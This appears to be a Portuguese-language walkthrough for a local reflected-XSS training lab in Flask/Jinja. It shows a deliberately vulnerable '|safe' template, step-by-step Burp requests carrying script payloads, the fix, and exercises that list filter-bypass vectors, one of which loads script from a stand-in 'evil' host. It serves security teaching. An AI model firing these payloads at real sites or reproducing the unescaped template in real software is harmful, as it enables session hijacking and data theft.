# Walkthrough — xss-reflected

## 1. Contexto

A app expõe uma página de "busca de posts". Você digita uma query em `/`, o form dispara um request `GET /search?q=<termo>`, e o servidor filtra uma lista seed de três posts por substring case-insensitive no título, depois renderiza os matches numa lista. Em cima da lista, a página ecoa um header: `Results for: <sua query>`. É nesse header que o bug vive.

## 2. Ache o bug

Dois arquivos entram na revisão. A view em [`vulnerable/app.py`](./vulnerable/app.py) parece limpa:

```python
@app.route("/search")
def search():
    q = request.args.get("q", "")
    results = [p for p in POSTS if q.lower() in p["title"].lower()]
    return render_template("search.html", q=q, results=results)
```

A source é óbvia (`request.args.get("q", "")`), mas não tem concatenação unescaped na view em si. O sink está a um arquivo de distância, em [`vulnerable/templates/search.html`](./vulnerable/templates/search.html):

```jinja
<h1>Results for: {{ q|safe }}</h1>
```

`{{ q }}` sozinho seria seguro — o Jinja faz autoescape por default, convertendo `<`, `>`, `&`, `'` e `"` em entidades HTML antes de chegarem na response. O filter `|safe` desliga essa proteção explicitamente pra essa expressão, dizendo pro Jinja "esse valor já é HTML confiável, emite ele na íntegra". Não é. Veio direto de `request.args`.

Três lições rápidas dessa forma:

- A source (`app.py`) e o sink (`search.html`) estão em arquivos diferentes. Uma review que só lê view functions perde bugs de XSS com frequência.
- `|safe` é um red flag confiável de XSS em projetos Jinja. `grep -rn '|safe' templates/` é uma auditoria de primeira passada barata.
- Autoescape estar *ligado* global não é garantia — qualquer filter específico, chamada `Markup(...)` ou bloco `{% autoescape false %}` desliga a proteção naquele ponto.

## 3. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte o browser pra ele. Visite <http://127.0.0.1:8002/>, submeta `flask` pelo form uma vez pra capturar o tráfego, depois clique com o botão direito no request `GET /search?q=flask` em **Proxy → HTTP history** e escolha **Send to Repeater**.

### Uma nota sobre URL encoding

Mesma regra de parser do átomo anterior: a request line do HTTP é `METHOD SP URI SP VERSION`, então **espaços literais dentro da URI quebram o request** — `400 Bad Request` antes do payload ser parseado como HTML. Encode todo espaço como `%20`. Os outros caracteres comuns em payloads de XSS (`<`, `>`, `'`, `"`, `/`) são legais dentro de uma query string pela RFC 3986 e passam sem encoding.

Se preferir não pensar nisso, cole o payload decoded no Repeater, selecione ele e aperte **Ctrl+U** — o Burp percent-encoda todo caractere unsafe. As duas formas chegam na app como a mesma string depois do URL-decode, então use a que for mais fácil de editar.

Cada passo abaixo mostra um **Payload** decoded (pra leitura) e uma **Request line** (pronta pra colar, com `%20` no lugar de qualquer espaço).

### Passo 1 — Confirmar a reflexão

Payload:

```
hello
```

Request line no Repeater:

```
GET /search?q=hello HTTP/1.1
Host: 127.0.0.1:8002
```

Corpo da response contém:

```html
<h1>Results for: hello</h1>
```

O input voltou inalterado na página. Essa é a reflexão — sua query é ecoada no HTML de resposta. Isso em si não é bug (toda página de busca faz isso); a pergunta é *como* esse eco é feito.

### Passo 2 — Confirmar HTML injection

Payload:

```
<b>hello</b>
```

Request line no Repeater:

```
GET /search?q=<b>hello</b> HTTP/1.1
Host: 127.0.0.1:8002
```

O corpo da response traz o header com a tag `<b>` intacta, não escapada pra entidades:

```html
<h1>Results for: <b>hello</b></h1>
```

Renderize a response no browser (aba **Render** no Repeater, ou abra a partir da Proxy history) e a palavra "hello" aparece em **negrito**. É a prova: seus angle brackets não foram encodados — foram parseados como markup. A partir daqui a app vai aceitar qualquer HTML que você mandar, incluindo `<script>`.

### Passo 3 — Executar JavaScript

Payload:

```
<script>alert(document.domain)</script>
```

Request line no Repeater:

```
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: 127.0.0.1:8002
```

Abra a response na render view do browser. Uma alert box aparece mostrando `127.0.0.1:8002` — o JavaScript que você enviou está rodando dentro da origin da app. Qualquer coisa que a própria app consegue fazer no browser (ler cookies dessa origin, fazer requests autenticados a partir da sessão do usuário, mudar o DOM, exfiltrar o corpo da página), esse script agora também faz.

Uma nota sobre por que esse payload funciona aqui. O servidor coloca sua tag `<script>` na **response HTML inicial**, que o browser parseia de cima pra baixo no load da página — inline script tags encontradas nesse parse sempre executam. No átomo futuro `xss-dom`, a vulnerabilidade vive inteiramente em JavaScript client-side que escreve input do usuário no DOM *depois* da página já ter carregado, e os browsers deliberadamente **não** executam script tags inseridas via `innerHTML` pós-load. O mesmo payload literal que funciona aqui vai falhar silenciosamente lá. A classe é a mesma ("string controlada pelo atacante vira JavaScript"), mas o sink é diferente, e o payload precisa casar com o sink.

## 4. Exploração via browser (trilha secundária, opcional)

Os mesmos três payloads colados direto na barra de endereços do browser (ou no input do form em `/`):

1. `http://127.0.0.1:8002/search?q=hello`
2. `http://127.0.0.1:8002/search?q=<b>hello</b>`
3. `http://127.0.0.1:8002/search?q=<script>alert(document.domain)</script>`

O browser URL-encoda os caracteres que precisam de encoding antes de enviar, então as formas cruas colam limpas. No passo 3 o alert dispara assim que a página carrega — nenhum Repeater necessário. Use esta trilha pra a primeira passada pra *sentir* o impacto, depois passe pro Burp pra tudo.

## 5. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança de uma linha. Em resumo: o template fixed larga o `|safe` e emite `{{ q }}` via autoescape default do Jinja. Todo caractere que poderia mexer no parser do HTML — `<`, `>`, `&`, `'`, `"` — vira entidade HTML no render. Rode qualquer payload da seção 3 contra <http://127.0.0.1:8102/search> pra confirmar: a página mostra visivelmente `<script>alert(document.domain)</script>` como texto, nada executa.

## 6. Tente você mesmo

1. **Outro vetor: `<svg>`.** Mande o payload `<svg onload=alert(1)>`. Mais curto que a variante `<script>` e não precisa nem da string literal `script` aparecer no request. SVG é vetor canônico de XSS — vale pesquisar variantes como `<svg><script>...</script></svg>`, `<iframe srcdoc=...>` e event handlers em tags tipo `<body onload>`, `<details ontoggle>`, `<input onfocus autofocus>`. Cada uma importa quando um filter bloqueia `<script>` especificamente mas deixa outras tags passarem.
2. **Mudar o filter, não o input.** Edite `vulnerable/templates/search.html` e troque `|safe` por `|e` (ou simplesmente apague o filter — mesmo efeito, autoescape assume). Rebuild o container, rode o passo 3 de novo — a página agora mostra o payload como texto visível. Você acabou de deployar o fix na mão; confirme que a app continua funcionando como busca com queries normais tipo `flask`.
3. **Raciocinar sobre um blacklist.** Imagine que o dev tentasse "sanitizar" removendo a substring literal `<script`. Qual destes payloads ainda dispararia alert sob essa regra, e por quê? (a) `<SCRIPT>alert(1)</SCRIPT>`, (b) `<img src=x onerror=alert(1)>`, (c) `<script src=//evil/x.js></script>`. Não precisa implementar o blacklist — raciocine em cada caso, depois mande os payloads e confira que seu raciocínio bate com o comportamento do servidor (obs: *este* lab não tem blacklist nenhum, então os três disparam; o exercício é prever o que aconteceria sob o filter hipotético).
